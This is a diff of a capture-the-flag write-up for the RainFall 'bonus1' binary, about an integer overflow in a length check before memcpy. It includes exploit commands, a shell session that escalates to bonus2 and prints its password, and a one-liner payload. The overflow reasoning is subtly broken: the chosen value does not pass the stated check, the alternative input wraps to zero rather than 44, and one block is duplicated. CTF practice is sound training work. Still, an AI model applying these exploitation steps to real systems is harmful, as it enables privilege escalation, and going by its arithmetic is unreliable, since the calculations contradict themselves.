@@ -1,16 +1,60 @@
 # Vulnerability
-Integer overflow in `memcpy()` length parameter.
+Integer overflow in num * 4 calculation. Check only verifies num <= 9.
+Exploitation Strategy
+Use integer overflow to bypass check and copy enough bytes to overwrite num variable.
 
-# Key Points
-```c
-int len = atoi(argv[1]);
-if (len < 10) {
-    memcpy(buffer, argv[2], len * 4);
-}
+# Calculating Overflow Value
+```sh
+#Goal: Copy 44 bytes (40 buffer + 4 for num)
+# Need: num * 4 = 44
+# But: num must be <= 9
+
+# Integer overflow solution:
+# (2^32 + 44) / 4 = 1073741835
+# 1073741835 * 4 = 44 (mod 2^32)
+# But 1073741835 > 9... wait!
+
+# Actually: 1073741835 wraps in signed int
+# In signed 32-bit: appears as negative, but memcpy uses unsigned!
+```
+
+
+# Finding Correct Value
+```sh
+# Test values where num * 4 wraps to 44:
+num = 1073741835
+
+# Verification:
+1073741835 * 4 = 4294967384 (unsigned)
+4294967384 mod 2^32 = 44
 ```
 
 # Exploit
-Use negative number to pass check but overflow in multiplication:
-- Input: -2147483647
-- len * 4 wraps to large positive number
-- Overflows buffer and overwrites return address
+```sh
+bonus1@RainFall:~$ ./bonus1 $(python exploit.py)
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+# Execution
+```sh 
+bonus1@RainFall:~$ ./bonus1 $(python exploit.py)
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+
+# Alternative Method
+```sh
+bonus1@RainFall:~$ ./bonus1 -2147483648 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
+```
+
+# Key Concepts
+Integer overflow
+Signed vs unsigned arithmetic
+Type confusion
+memcpy() size manipulation
